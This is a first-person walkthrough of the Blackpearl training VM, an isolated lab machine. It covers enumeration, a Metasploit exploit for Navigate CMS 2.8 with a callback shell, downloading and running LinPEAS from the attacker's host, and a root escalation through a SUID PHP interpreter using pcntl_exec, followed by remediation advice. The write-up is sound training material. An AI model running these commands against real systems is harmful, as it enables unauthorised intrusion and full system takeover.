Blackpearl

I investigated exposed web functionality and local privilege boundaries on Blackpearl, an isolated Linux training VM.

Target environment

  • Target: Blackpearl
  • Operating system: Linux
  • Architecture: x86_64 (64-bit)
  • Service / application: Nginx 1.14.2; Navigate CMS 2.8
  • Weakness investigated: Navigate CMS remote code execution; root-owned SUID PHP interpreter
  • Scope: Intentionally vulnerable, isolated training VM

1. DNS enumeration and hostname resolution

I used DNSRecon to enumerate the target and identify blackpearl.tcm.

Placeholders such as <TARGET_IP> stand in for lab addresses.

Representative command

dnsrecon -d blackpearl.tcm

I added the hostname to /etc/hosts on Kali and my Mac and checked it with getent:

Documented command

sudo nano /etc/hosts
# added:
<TARGET_IP> blackpearl.tcm

getent hosts blackpearl.tcm
<TARGET_IP> blackpearl.tcm

I checked HTTP connectivity with curl:

Documented command

curl -I http://blackpearl.tcm
HTTP/1.1 200 OK
Server: nginx/1.14.2
Content-Type: text/html; charset=UTF-8

2. Web content discovery

I ran FFUF with the medium DirBuster wordlist:

Documented command

ffuf -u http://blackpearl.tcm/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Many responses were identical (status 200, 652 bytes, 82 words, 27 lines), which I treated as a baseline rather than real content. One result differed:

Documented command

secret [Status: 200, Size: 209, Words: 31, Lines: 9]

I reran it with -fs 652 to filter the baseline and -s for silent output.

Documented command

ffuf -u http://blackpearl.tcm/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fs 652 -s

Further enumeration found /navigate, running Navigate CMS 2.8, which became my target; /secret was a separate result, not the access vector.

3. Vulnerability research

The walkthrough identifies a Metasploit module for Navigate CMS 2.8 that chains an authentication bypass with path traversal in the upload handler to place and execute PHP code.

I configured the target, virtual host and callback; the capture shows the LHOST, RHOST and VHOST settings.

Documented command

msfconsole
search navigate_cms
use exploit/multi/http/navigate_cms_rce
show options
set LHOST <CALLBACK_IP>
set RHOST <TARGET_IP>
set VHOST blackpearl.tcm
set TARGETURI /navigate/
exploit

4. Initial access

I ran the exploit and got a shell; whoami confirmed www-data. That was command execution as the web service account, so I still needed a local escalation path.

5. Shell stabilization and local enumeration

The shell was limited, so I spawned interactive Bash with Python’s pty module.

Documented command

python -c 'import pty; pty.spawn("/bin/bash")'

I checked my identity, groups, sudo rights and shell history. None gave an escalation path.

Documented command

whoami
id
sudo -l
history

6. LinPEAS enumeration

I served LinPEAS, a Linux privilege escalation enumeration script, from Kali on port 80.

Documented command

python3 -m http.server 80

I downloaded it to /tmp on Blackpearl, made it executable and ran it. The server log confirms the download; the exact download command was not captured, so wget below is representative.

Representative command

cd /tmp
wget http://<CALLBACK_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

I reviewed the output for SUID/SGID executables, writable paths, privileged processes, scheduled tasks and configuration weaknesses; it flagged PHP 7.3 as a potential escalation vector.

7. SUID PHP investigation

I enumerated SUID (set user ID) binaries, which are executables that run with their owner’s effective privileges, and inspected /usr/bin/php7.3.

Documented command

find / -type f -perm -4000 2>/dev/null
ls -l /usr/bin/php7.3

The root-owned PHP interpreter could run with elevated effective privileges, and GTFOBins describes using pcntl_exec() to launch a shell that keeps them.

8. Privilege escalation

I ran:

Documented command

/usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'

This was a permissions problem, not a PHP vulnerability: a general-purpose interpreter had root privileges. pcntl_exec() replaced the PHP process with /bin/sh, and -p kept the effective privileges inherited from the SUID interpreter. whoami confirmed root:

Documented command

www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'
# whoami
root

My notes record that the original low-privileged UID stayed visible, as expected when the real UID is www-data and the effective UID is root.

9. Result and evidence limits

Result: Root access achieved

I went from Navigate CMS 2.8 to a www-data shell, then to root through a root-owned SUID PHP interpreter.

Commands marked representative were not saved as exact terminal history. Recommended fixes were not retested.

11. Findings and remediation

Attack / finding

Navigate CMS remote code execution

I exploited the CMS to execute commands as www-data, exposing whatever that account could access and giving me a foothold.

Recommended defensive action

Upgrade to a supported, fixed CMS release or replace it, then verify the authentication and upload handlers no longer permit the chain. Restrict unnecessary functionality and service-account permissions.

Attack / finding

SUID PHP privilege escalation

I used the privileged PHP interpreter to escalate from www-data to a root shell.

Recommended defensive action

Remove unnecessary SUID permissions from interpreter binaries, audit privileged executable ownership and permissions, and enforce least privilege.
